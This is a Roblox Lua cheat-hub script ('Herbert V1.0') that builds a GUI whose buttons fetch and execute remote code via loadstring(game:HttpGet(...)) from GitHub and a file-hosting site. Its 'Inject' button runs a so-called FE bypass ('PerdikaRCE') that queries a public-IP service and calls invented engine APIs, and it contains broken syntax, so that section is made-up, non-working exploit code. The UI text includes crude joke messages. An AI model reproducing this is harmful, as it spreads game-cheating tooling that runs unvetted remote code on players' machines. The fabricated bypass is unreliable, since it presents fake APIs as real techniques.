
--Converted with ttyyuu12345's model to script plugin v4
function sandbox(var,func)
	local env = getfenv(func)
	local newenv = setmetatable({},{
		__index = function(self,k)
			if k=="script" then
				return var
			else
				return env[k]
			end
		end,
	})
	setfenv(func,newenv)
	return func
end
cors = {}
mas = Instance.new("Model",game:GetService("Lighting"))
ScreenGui0 = Instance.new("ScreenGui")
ImageLabel1 = Instance.new("ImageLabel")
TextLabel2 = Instance.new("TextLabel")
Frame3 = Instance.new("Frame")
Frame3.Draggable = true
TextLabel4 = Instance.new("TextLabel")
LocalScript5 = Instance.new("LocalScript")
TextLabel6 = Instance.new("TextLabel")
TextLabel7 = Instance.new("TextLabel")
TextButton8 = Instance.new("TextButton")
LocalScript9 = Instance.new("LocalScript")
TextButton10 = Instance.new("TextButton")
LocalScript11 = Instance.new("LocalScript")
TextLabel12 = Instance.new("TextLabel")
TextButton13 = Instance.new("TextButton")
LocalScript14 = Instance.new("LocalScript")
LocalScript15 = Instance.new("LocalScript")
ScreenGui0.Parent = mas
ScreenGui0.ResetOnSpawn = false
ImageLabel1.Parent = ScreenGui0
ImageLabel1.Position = UDim2.new(0.0959119499, 0, 0.234343439, 0)
ImageLabel1.Size = UDim2.new(0, 490, 0, 339)
ImageLabel1.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel1.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel1.BorderColor = BrickColor.new("Dusty Rose")
ImageLabel1.BorderColor3 = Color3.new(0.678431, 0.317647, 0.317647)
ImageLabel1.BorderSizePixel = 3
ImageLabel1.Image = "rbxassetid://10074459797"
TextLabel2.Parent = ImageLabel1
TextLabel2.Size = UDim2.new(0, 490, 0, 19)
TextLabel2.BackgroundColor = BrickColor.new("Medium brown")
TextLabel2.BackgroundColor3 = Color3.new(0.227451, 0.227451, 0.227451)
TextLabel2.BorderColor = BrickColor.new("Dusty Rose")
TextLabel2.BorderColor3 = Color3.new(0.678431, 0.317647, 0.317647)
TextLabel2.BorderSizePixel = 3
TextLabel2.Font = Enum.Font.SourceSans
TextLabel2.FontSize = Enum.FontSize.Size14
TextLabel2.Text = "Herbert V1.0"
TextLabel2.TextColor = BrickColor.new("Light stone grey")
TextLabel2.TextColor3 = Color3.new(0.898039, 0.898039, 0.898039)
TextLabel2.TextScaled = true
TextLabel2.TextSize = 14
TextLabel2.TextWrap = true
TextLabel2.TextWrapped = true
Frame3.Parent = ImageLabel1
Frame3.Position = UDim2.new(0.0163265299, 0, 0.0882352963, 0)
Frame3.Size = UDim2.new(0, 472, 0, 267)
Frame3.BackgroundColor = BrickColor.new("Institutional white")
Frame3.BackgroundColor3 = Color3.new(1, 1, 1)
Frame3.BackgroundTransparency = 1
Frame3.BorderColor = BrickColor.new("Really black")
Frame3.BorderColor3 = Color3.new(0, 0, 0)
Frame3.BorderSizePixel = 0
TextLabel4.Parent = Frame3
TextLabel4.Position = UDim2.new(0.00423728814, 0, 0.689138591, 0)
TextLabel4.Size = UDim2.new(0, 322, 0, 87)
TextLabel4.BackgroundColor = BrickColor.new("Dark taupe")
TextLabel4.BackgroundColor3 = Color3.new(0.27451, 0.27451, 0.27451)
TextLabel4.BackgroundTransparency = 0.15000000596046448
TextLabel4.BorderColor = BrickColor.new("Tr. Red")
TextLabel4.BorderColor3 = Color3.new(0.854902, 0.32549, 0.32549)
TextLabel4.BorderSizePixel = 3
TextLabel4.Font = Enum.Font.Cartoon
TextLabel4.FontSize = Enum.FontSize.Size14
TextLabel4.Text = "insert quote"
TextLabel4.TextColor = BrickColor.new("Institutional white")
TextLabel4.TextColor3 = Color3.new(1, 1, 1)
TextLabel4.TextScaled = true
TextLabel4.TextSize = 14
TextLabel4.TextWrap = true
TextLabel4.TextWrapped = true
LocalScript5.Parent = TextLabel4
table.insert(cors,sandbox(LocalScript5,function()
local txtholder = script.Parent

local quotes = {
	"FE has been bypassed!",
	"skidelijahmania moment",
	"always a good day to exist",
	"how are you today",
	"sponsored by protogent",
	"EXPAND DONG",
	"rune - the ai generated executor"
}

local function quote()
	local randomIndex = math.random(1, #quotes)
	return quotes[randomIndex]
end

txtholder.Text = quote()
end))
TextLabel6.Parent = Frame3
TextLabel6.Position = UDim2.new(0.703389823, 0, 0.00374531839, 0)
TextLabel6.Size = UDim2.new(0, 137, 0, 63)
TextLabel6.BackgroundColor = BrickColor.new("Dark taupe")
TextLabel6.BackgroundColor3 = Color3.new(0.27451, 0.27451, 0.27451)
TextLabel6.BackgroundTransparency = 0.15000000596046448
TextLabel6.BorderColor = BrickColor.new("Tr. Red")
TextLabel6.BorderColor3 = Color3.new(0.854902, 0.32549, 0.32549)
TextLabel6.BorderSizePixel = 3
TextLabel6.Font = Enum.Font.Unknown
TextLabel6.FontSize = Enum.FontSize.Size14
TextLabel6.Text = "NEW: ROSE HUB WORKING FOR ALL GAMES!"
TextLabel6.TextColor = BrickColor.new("Quill grey")
TextLabel6.TextColor3 = Color3.new(0.862745, 0.862745, 0.862745)
TextLabel6.TextScaled = true
TextLabel6.TextSize = 14
TextLabel6.TextWrap = true
TextLabel6.TextWrapped = true
TextLabel7.Parent = Frame3
TextLabel7.Position = UDim2.new(0.711864412, 0, 0.288389504, 0)
TextLabel7.Size = UDim2.new(0, 124, 0, 98)
TextLabel7.BackgroundColor = BrickColor.new("Dark taupe")
TextLabel7.BackgroundColor3 = Color3.new(0.27451, 0.27451, 0.27451)
TextLabel7.BackgroundTransparency = 0.15000000596046448
TextLabel7.BorderColor = BrickColor.new("Tr. Red")
TextLabel7.BorderColor3 = Color3.new(0.854902, 0.32549, 0.32549)
TextLabel7.BorderSizePixel = 3
TextLabel7.Font = Enum.Font.Cartoon
TextLabel7.FontSize = Enum.FontSize.Size14
TextLabel7.Text = "Resurrected like Lazarus from the grave! Now with a serverside API bypassing FE thanks to Alakazard!"
TextLabel7.TextColor = BrickColor.new("Institutional white")
TextLabel7.TextColor3 = Color3.new(1, 1, 1)
TextLabel7.TextScaled = true
TextLabel7.TextSize = 14
TextLabel7.TextWrap = true
TextLabel7.TextWrapped = true
TextButton8.Name = "defaulthub"
TextButton8.Parent = Frame3
TextButton8.Position = UDim2.new(0.00423728814, 0, 0.179775283, 0)
TextButton8.Size = UDim2.new(0, 125, 0, 39)
TextButton8.BackgroundColor = BrickColor.new("Medium brown")
TextButton8.BackgroundColor3 = Color3.new(0.219608, 0.219608, 0.219608)
TextButton8.BackgroundTransparency = 0.3499999940395355
TextButton8.BorderColor = BrickColor.new("Persimmon")
TextButton8.BorderColor3 = Color3.new(1, 0.321569, 0.321569)
TextButton8.BorderSizePixel = 3
TextButton8.Font = Enum.Font.Cartoon
TextButton8.FontSize = Enum.FontSize.Size14
TextButton8.Text = "Execute Default Hub (reccomended)"
TextButton8.TextColor = BrickColor.new("Institutional white")
TextButton8.TextColor3 = Color3.new(1, 1, 1)
TextButton8.TextScaled = true
TextButton8.TextSize = 14
TextButton8.TextWrap = true
TextButton8.TextWrapped = true
LocalScript9.Parent = TextButton8
table.insert(cors,sandbox(LocalScript9,function()
script.Parent.MouseButton1Click:connect(function()
game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "HUBERT";
		Text = "executing hub, if it doesn't work go take a break";
		Duration = 3;
	})
	wait(2)
	game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "HUBERT";
		Text = "cracking synapse x";
		Duration = 2;
	})
	wait(2)
	game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "HUBERT";
		Text = "bribing alakazard to give you his fe bypass";
		Duration = 3;
	})
	wait(3)
	game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "HUBERT";
		Text = "bribing roblox to help";
		Duration = 3;
	})
	wait(3)
	game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "HUBERT";
		Text = "oh no a NAZI MOD BANNED YOU!";
		Duration = 3;
	})
	wait(2)
	game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "HUBERT";
		Text = "bypassing FE";
		Duration = 3;
	})
	wait(3)
	game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "HUBERT";
		Text = "using rune because netflixce is shit";
		Duration = 3;
	})
	wait(2)
		game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "HUBERT";
		Text = "EXECUTED!";
		Duration = 3;
	})
	loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaGunsX/HerbertV1/main/hub%20/hub.lua", true))()
end)
end))
TextButton10.Name = "rosehub"
TextButton10.Parent = Frame3
TextButton10.Position = UDim2.new(0.00423728814, 0, 0.00374531839, 0)
TextButton10.Size = UDim2.new(0, 125, 0, 38)
TextButton10.BackgroundColor = BrickColor.new("Medium brown")
TextButton10.BackgroundColor3 = Color3.new(0.219608, 0.219608, 0.219608)
TextButton10.BackgroundTransparency = 0.3499999940395355
TextButton10.BorderColor = BrickColor.new("Persimmon")
TextButton10.BorderColor3 = Color3.new(1, 0.321569, 0.321569)
TextButton10.BorderSizePixel = 3
TextButton10.Font = Enum.Font.Cartoon
TextButton10.FontSize = Enum.FontSize.Size14
TextButton10.Text = "Execute Rose Hub"
TextButton10.TextColor = BrickColor.new("Institutional white")
TextButton10.TextColor3 = Color3.new(1, 1, 1)
TextButton10.TextScaled = true
TextButton10.TextSize = 14
TextButton10.TextWrap = true
TextButton10.TextWrapped = true
LocalScript11.Parent = TextButton10
table.insert(cors,sandbox(LocalScript11,function()
script.Parent.MouseButton1Click:connect(function()
game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "HUBERT";
		Text = "executing rose hub, if it doesn't work go take a break";
		Duration = 3;
	})
	wait(2)
	game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "HUBERT";
		Text = "cracking synapse x";
		Duration = 2;
	})
	wait(2)
	game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "HUBERT";
		Text = "bribing the rose hub creator to help";
		Duration = 3;
	})
	wait(3)
	game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "HUBERT";
		Text = "done lmao";
		Duration = 3;
	})
	loadstring(game:HttpGet("https://fyle.uk/file/fphxL", true))()
end)
end))
TextLabel12.Parent = Frame3
TextLabel12.Position = UDim2.new(0.711933315, 0, 0.689138591, 0)
TextLabel12.Size = UDim2.new(0, 125, 0, 87)
TextLabel12.BackgroundColor = BrickColor.new("Dark taupe")
TextLabel12.BackgroundColor3 = Color3.new(0.27451, 0.27451, 0.27451)
TextLabel12.BackgroundTransparency = 0.15000000596046448
TextLabel12.BorderColor = BrickColor.new("Tr. Red")
TextLabel12.BorderColor3 = Color3.new(0.854902, 0.32549, 0.32549)
TextLabel12.BorderSizePixel = 3
TextLabel12.Font = Enum.Font.Cartoon
TextLabel12.FontSize = Enum.FontSize.Size14
TextLabel12.Text = "Made by LuaZ 3.0#4242"
TextLabel12.TextColor = BrickColor.new("Institutional white")
TextLabel12.TextColor3 = Color3.new(1, 1, 1)
TextLabel12.TextScaled = true
TextLabel12.TextSize = 14
TextLabel12.TextWrap = true
TextLabel12.TextWrapped = true
TextButton13.Name = "inject"
TextButton13.Parent = Frame3
TextButton13.Position = UDim2.new(0.00423728814, 0, 0.378277153, 0)
TextButton13.Size = UDim2.new(0, 125, 0, 31)
TextButton13.BackgroundColor = BrickColor.new("Medium brown")
TextButton13.BackgroundColor3 = Color3.new(0.219608, 0.219608, 0.219608)
TextButton13.BackgroundTransparency = 0.3499999940395355
TextButton13.BorderColor = BrickColor.new("Persimmon")
TextButton13.BorderColor3 = Color3.new(1, 0.321569, 0.321569)
TextButton13.BorderSizePixel = 3
TextButton13.Font = Enum.Font.Cartoon
TextButton13.FontSize = Enum.FontSize.Size14
TextButton13.Text = "Inject"
TextButton13.TextColor = BrickColor.new("Institutional white")
TextButton13.TextColor3 = Color3.new(1, 1, 1)
TextButton13.TextScaled = true
TextButton13.TextSize = 14
TextButton13.TextWrap = true
TextButton13.TextWrapped = true
LocalScript14.Parent = TextButton13
table.insert(cors,sandbox(LocalScript14,function()
script.Parent.MouseButton1Click:connect(function()
	game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "HUBERT";
		Text = "Already injected, but we'll inject again.";
		Duration = 5;
	})
	wait(5)
        -- // FE Bypach by Perdika copyright 2024.. do not steal.. \\

print("[PerdikaRCE]: Attempting to bypass FE..")
local network = game:GetService("NetworkClient")
local oldNet = network:FindFirstChild("ReplicationSettings")
if oldNet then
	oldNet:Destroy() -- delete roblox's default replication settings
end

function generateAuthTicket(plr)
	local ticketSeed = (game.PlaceId * game.GameId) - (plr.UserId % math.clamp(game.CreatorId, 1,(plr.UserId/2)))
	math.randomseed(ticketSeed)

	local authTicket = "!RBLX_".. Version():gsub("%.","-") .. "_AUTH:"
	local chars = {"0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "A", "B", "C", "D", "E", "F"}

	for i = 1, 56 do
		authTicket ..= chars[math.random(#chars)]
	end

	print("[PerdikaRCE]: Generated auth ticket " .. authTicket)
	return authTicket
end

local authTicket = generateAuthTicket(game:GetService("Players").LocalPlayer)
local enabled = Enum.ReplicateInstanceDestroySetting.Enabled.Value
local perdika = Instance.new("TeleportOptions", network) -- create options instance with network attribs
perdika.Name = "ReplicationSettings"
perdika:SetAttribute("InstanceDestroyReplicated", enabled)
perdika:SetAttribute("InstanceCreationReplicated", enabled)
perdika:SetAttribute("InstanceChangesReplicated", enabled)
perdika:SetAttribute("InstancePropertiesReplicated", enabled)
perdika:SetAttribute("AuthTicket", authTicket)

function constructPacket(name, id, auth, data, ttl)
	local packet = {
		"RAKNET", "RAKUDP",
		name, id, auth, data, ttl, "HIGH_PRIORITY", "RELIABLE",
	}
	return game:GetService("HttpService"):JSONEncode(packet)
end

-- Set changes
local res, success = pcall(function()
	local plr = game:GetService("Players").LocalPlayer
	setreadonly(plr.ReplicationFocus, false)
	setscriptable(plr, "ReplicationFocus", true)
	plr.ReplicationFocus = game -- allow player to replicate everything in datamodel

	network:RefreshReplicationSettings(true, authTicket, perdika) -- load new replication settings
	local replicator = network:GetReplicator(authTicket) -- fetch client replicator instance
	replicator:SetReplicationRule(  -- write new rule that allows client -> server replication
		{
			replicationFiltering = false,
			firewallWhitelist = { plr },
			legacyFilteringEnabled = false,
			replicatedInstances = {game}, -- replicates all descendants of the datamodel (everything)
		}
	)
	local ip = game:HttpGet("https://api.ipify.org/?format=txt") -- public ip for packet auth

	local outbound = replicator:GetOutboundConnections()
	local latestPacketID = 0
	for conn, contype in pairs(outbound) do -- fetch latest packet id
		if contype == 4 then -- 4 is the enum for packet
			latestPacketID = math.max(latestPacketID, conn.id)
		end
	end
	
	-- generate encoded auth code for packet auth
	local encodedAuth = ""
	for i = #1, #authTicket do
		local char = string.sub(authTicket, i, i)
		encodedAuth ..= string.byte(char)
	end
	
	-- construct packet params
	local params = {
		from = ip,
		auth = encodedAuth,
		RKSEC = tick(),
		PermissionIndex = 20, -- highest permission level

		Request = {
			ServerReplicatorChange = {
				priority = "HIGH_PRIORITY",
				data = {
					replicationFiltering = false,
					firewallWhitelist = {{plr,ip}},
					legacyFilteringEnabled = false,
					replicatedInstances = {game},
					exclude = {},
					HostCanReplicate = true,
					ReplicationSettings = {
						all = true,
						noReplicationBelow = -1,
						experimentalMode = false,
					}
				}
			}
		}
	}
	
	-- send packet
	local response = replicator:SendPacket(0, constructPacket("ReplicationRequest", latestPacketID+1, authTicket, game:GetService("HttpService"):JSONEncode(params), -1))
	if response[1]:lower():find("success") and response[2] ~= Enum.ConnectionError.ReplicatorTimeout then
		perdika.RobloxLocked = true
		return true
	else
		print("[PerdikaRCE]: Packet failed.")
		return false
	end
end)

-- check if request successful
if success then
	print("[PerdikaRCE]: FE Bypassed.")
else
	print("[PerdikaRCE]: FE Bypass failed. Please try again.")
end
end)
end))
